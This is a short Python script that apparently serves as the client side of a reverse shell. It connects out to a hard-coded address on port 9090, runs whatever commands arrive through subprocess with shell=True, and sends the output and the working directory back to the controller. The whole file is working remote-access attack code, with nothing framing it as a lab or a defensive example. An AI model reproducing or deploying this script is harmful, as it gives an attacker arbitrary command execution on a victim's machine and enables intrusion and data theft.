import socket
import sys #SYS enables one to run system commands
import threading
import time
from queue import Queue
import os
import subprocess
import threading
import platform
###TRIAL
#command = "firefox"
#os.system(command)



def starting_client():
	sckt = socket.socket()
	host = '192.168.1.116'
	port  = 9090
	sckt.connect((host, port))
	while True:
		data = sckt.recv(1024) #Data received from the server
		try:
			if data[:2].decode("utf-8") == 'cd': # If users enters CD
				os.chdir(data[3:].decode("utf-8"))
		except Exception as DirectoryError:
			print(f"There is no such Directory: {DirectoryError}")
		if len(data) > 0:
			cmd = subprocess.Popen(data[0:].decode("utf-8"), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin =  subprocess.PIPE)
			output_bytes = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_bytes, "utf-8")
			sckt.send(str.encode(output_str + str(os.getcwd()) + "\033[31m > \033[0m"))
			#print(output_str)  

	sckt.close()

starting_client()












